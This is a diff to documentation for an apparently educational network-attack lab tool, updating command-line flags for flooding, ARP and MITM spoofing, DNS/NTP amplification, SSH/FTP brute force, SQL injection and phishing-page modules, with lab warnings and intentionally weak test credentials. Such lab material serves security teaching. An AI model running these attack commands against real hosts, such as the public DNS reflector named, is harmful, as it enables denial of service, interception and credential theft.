@@ -252,13 +252,13 @@ docker compose exec attacker \
   matcha udp-flood \
     --target-ip $TARGET_IP \
     --target-port 80 \
-    --count 500
+    --packet-count 500
 ```
 
 **Key parameters:**
 - `--target-ip` — target IP or hostname
 - `--target-port` — UDP port
-- `--count` — number of packets
+- `--packet-count` — number of packets
 
 ---
 
@@ -283,13 +283,15 @@ sequenceDiagram
 docker compose exec attacker \
   matcha arp-spoof \
     --target-ip <victim-ip> \
-    --gateway-ip <gateway-ip>
+    --gateway-ip <gateway-ip> \
+    --count 20
 ```
 
 **Key parameters:**
 - `--target-ip` — victim IP
 - `--gateway-ip` — gateway IP to impersonate
 - `--interface` — network interface
+- `--count` — number of ARP packet pairs to send (default: 50; 0 for infinite)
 
 **Safety:** always ensure ARP tables are restored after the test.
 
@@ -316,14 +318,16 @@ sequenceDiagram
 docker compose exec attacker \
   matcha dns-amplification \
     --target-ip <victim-ip> \
-    --dns-server 8.8.8.8 \
-    --query-domain example.com
+    --dns-servers 8.8.8.8 \
+    --domain example.com \
+    --query-count 50
 ```
 
 **Key parameters:**
 - `--target-ip` — victim IP (receives amplified traffic)
-- `--dns-server` — reflector DNS server
-- `--query-domain` — domain to query
+- `--dns-servers` — reflector DNS server
+- `--domain` — domain to query
+- `--query-count` — number of DNS queries to send (default: 1000)
 
 > Use only in fully isolated lab networks. Never point at real infrastructure.
 
@@ -456,14 +460,14 @@ sequenceDiagram
 ```bash
 docker compose exec attacker \
   matcha smurf-attack \
-    --victim <victim-ip> \
-    --broadcast <broadcast-ip> \
-    --count 100
+    --victim-ip <victim-ip> \
+    --broadcast-ip <broadcast-ip> \
+    --count 10
 ```
 
 **Key parameters:**
-- `--victim` — victim IP
-- `--broadcast` — broadcast address of the network
+- `--victim-ip` — victim IP
+- `--broadcast-ip` — broadcast address of the network
 
 ---
 
@@ -481,13 +485,13 @@ sequenceDiagram
 ```bash
 docker compose exec attacker \
   matcha ntp-amplification \
-    --victim <victim-ip> \
+    --victim-ip <victim-ip> \
     --ntp-servers "1.2.3.4,5.6.7.8" \
     --count 50
 ```
 
 **Key parameters:**
-- `--victim` — victim IP
+- `--victim-ip` — victim IP
 - `--ntp-servers` — comma-separated NTP reflector list
 - `--count` — number of queries
 
@@ -500,7 +504,7 @@ Educational simulation of BGP route announcement manipulation.
 ```bash
 docker compose exec attacker \
   matcha bgp-hijacking \
-    --prefix 1.2.3.0/24 \
+    --target-prefix 1.2.3.0/24 \
     --as-number 65000
 ```
 
@@ -529,20 +533,18 @@ sequenceDiagram
 docker compose exec attacker \
   matcha http-dos \
     --target-url http://target \
-    --threads 10
+    --num-connections 10
 
-# With more control
+# With more connections
 docker compose exec attacker \
   matcha http-dos \
     --target-url http://target \
-    --threads 20 \
-    --timeout 5
+    --num-connections 20
 ```
 
 **Key parameters:**
 - `--target-url` — full URL including scheme
-- `--threads` — parallel request threads
-- `--timeout` — per-request timeout (seconds)
+- `--num-connections` — number of concurrent connections (default: 10)
 
 Watch the target's nginx log while this runs:
 
@@ -588,12 +590,12 @@ graph TB
 docker compose exec attacker \
   matcha slowloris \
     --target-url http://target \
-    --connections 50
+    --sockets 50
 ```
 
 **Key parameters:**
 - `--target-url` — target URL
-- `--connections` — number of slow connections to maintain
+- `--sockets` — number of slow connections to maintain (default: 150)
 
 ---
 
@@ -622,14 +624,14 @@ docker compose exec attacker \
   matcha ssh-brute-force \
     --target-ip $TARGET_IP \
     --username demo \
-    --wordlist /tmp/wordlist.txt
+    --passwords /tmp/wordlist.txt
 ```
 
 **Key parameters:**
 - `--target-ip` — target IP or hostname
 - `--username` — username to test
-- `--wordlist` — path to password list
-- `--port` — SSH port (default: 22)
+- `--passwords` — path to password list
+- `--target-port` — SSH port (default: 22)
 
 **Target credentials (intentionally weak):**
 - `demo` / `password123`
@@ -649,15 +651,15 @@ docker compose exec attacker sh -c \
 
 docker compose exec attacker \
   matcha ftp-brute-force \
-    --target-ip $TARGET_IP \
+    --host $TARGET_IP \
     --username anonymous \
-    --wordlist /tmp/ftp_words.txt
+    --passwords /tmp/ftp_words.txt
 ```
 
 **Key parameters:**
-- `--target-ip` — FTP server host
+- `--host` — FTP server host
 - `--username` — username to test
-- `--wordlist` — password list path
+- `--passwords` — password list path
 - `--port` — FTP port (default: 21)
 
 ---
@@ -698,15 +700,13 @@ graph TB
 ```bash
 docker compose exec attacker \
   matcha sql-injection \
-    --target http://target/login.php \
-    --parameter username \
-    --dbms mysql
+    --target-url http://target/login.php \
+    --control-name username
 ```
 
 **Key parameters:**
-- `--target` — URL of the vulnerable endpoint
-- `--parameter` — parameter name to test
-- `--dbms` — database type (`mysql`, `postgresql`, etc.)
+- `--target-url` — URL of the vulnerable endpoint
+- `--control-name` — parameter name to test
 
 ---
 
@@ -800,17 +800,17 @@ sequenceDiagram
 ```bash
 docker compose exec attacker \
   matcha mitm \
-    --target <victim-ip> \
-    --gateway <gateway-ip> \
+    --target-ip <victim-ip> \
+    --gateway-ip <gateway-ip> \
     --interface eth0 \
-    --capture /tmp/captured.pcap
+    --capture-file /tmp/captured.pcap
 ```
 
 **Key parameters:**
-- `--target` — victim IP
-- `--gateway` — gateway IP
+- `--target-ip` — victim IP
+- `--gateway-ip` — gateway IP
 - `--interface` — network interface
-- `--capture` — optional PCAP output path
+- `--capture-file` — optional PCAP output path
 
 ---
 
@@ -836,9 +836,8 @@ docker compose exec attacker \
 ```
 
 **Key parameters:**
-- `--template` — predefined template or `--target-url` to clone a real page
-- `--port` — port to serve the phishing page on
-- `--log-file` — where to save captured credentials
+- `--template` — predefined template name or URL of page to clone
+- `--port` — port to serve the phishing page on (default: 8080)
 
 ---
 
@@ -868,7 +867,7 @@ docker run --rm \
   matcha pcap-replay \
     --pcap-file /pcaps/capture.pcap \
     --interface eth0 \
-    --speed 2.0
+    --rate 2.0
 
 # Or if the pcap is already inside the attacker container
 docker compose exec attacker \
@@ -880,7 +879,7 @@ docker compose exec attacker \
 **Key parameters:**
 - `--pcap-file` — path to the `.pcap` file
 - `--interface` — network interface to send on
-- `--speed` — playback speed multiplier (1.0 = real-time, 2.0 = double speed)
+- `--rate` — playback speed multiplier (1.0 = real-time, 2.0 = double speed)
 
 ---
 
